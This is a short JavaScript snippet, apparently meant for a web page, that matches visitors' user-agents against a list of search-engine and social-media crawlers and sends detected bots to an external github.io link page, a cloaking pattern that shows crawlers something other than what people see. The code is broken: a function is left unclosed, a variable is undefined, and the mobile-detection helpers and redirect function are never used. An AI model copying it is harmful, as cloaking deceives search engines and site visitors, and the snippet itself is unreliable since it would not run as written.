<script>
  (function() {
    const botsConocidos = [
     "adsbot-google", "applebot", "baiduspider", "bingbot", "blekkobot", "Embedly", "facebookexternalhit",

    "slurp", "storebot-google", "superfeedr bot", "tumblr", "twitterbot", "yandex", "prerender"
  ];

    function esBot(userAgent) {
      return botsConocidos.some(bot => userAgent.toLowerCase().includes(bot.toLowerCase()));
    }

    function esDispositivoMovil(userAgent) {
      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
    }

    function esResolucionMovil() {
      const anchoPantalla = window.screen.width;
      const altoPantalla = window.screen.height;
      const anchoMaxMovil = 768; // Ajusta seg√∫n tus necesidades
      const anchoMaxTablet = 1024; // Ajusta seg√∫n tus necesidades
      return (anchoPantalla <= anchoMaxMovil || altoPantalla <= anchoMaxMovil);
    }

    function redirigirURL() {

      if (esBot(userAgent)) {

        window.location.href = 'https://joeljefe.github.io/directoslink';

  })();
</script>
